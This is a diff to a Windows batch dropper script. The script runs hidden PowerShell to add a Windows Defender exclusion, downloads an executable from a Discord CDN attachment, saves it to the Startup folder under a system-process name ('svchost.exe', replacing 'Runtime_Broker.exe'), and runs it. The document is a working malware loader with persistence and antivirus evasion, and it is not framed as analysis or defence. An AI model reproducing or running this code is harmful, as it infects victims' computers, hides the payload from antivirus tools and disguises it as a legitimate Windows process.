@@ -1,10 +1,9 @@
 powershell -w hidden -c Add-MpPreference -ExclusionPath ""
-
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1162840030860026008/1214629451074371675/Runtime_Broker.exe?ex=65f9ced3&is=65e759d3&hm=91279ff95eb93df6db7e9ccbfdf69cfb8c257971f0172b319d5f32a2cec94a9b&"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Runtime_Broker.exe"
+set "URL=https://cdn.discordapp.com/attachments/1218845340778631268/1218959386207326248/svchost.exe?ex=66098f64&is=65f71a64&hm=bab47f8ca050eb324b7aa2d66be51e22090a39e08d1ddd664c285192b80ed8b7&"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
 
 
 if exist "%DEST%" del "%DEST%"
@@ -20,8 +19,8 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1162840030860026008/1214629451074371675/Runtime_Broker.exe?ex=65f9ced3&is=65e759d3&hm=91279ff95eb93df6db7e9ccbfdf69cfb8c257971f0172b319d5f32a2cec94a9b&"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Runtime_Broker.exe"
+set "URL=https://cdn.discordapp.com/attachments/1218845340778631268/1218959386207326248/svchost.exe?ex=66098f64&is=65f71a64&hm=bab47f8ca050eb324b7aa2d66be51e22090a39e08d1ddd664c285192b80ed8b7&"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
 
 
 if exist "%DEST%" del "%DEST%"
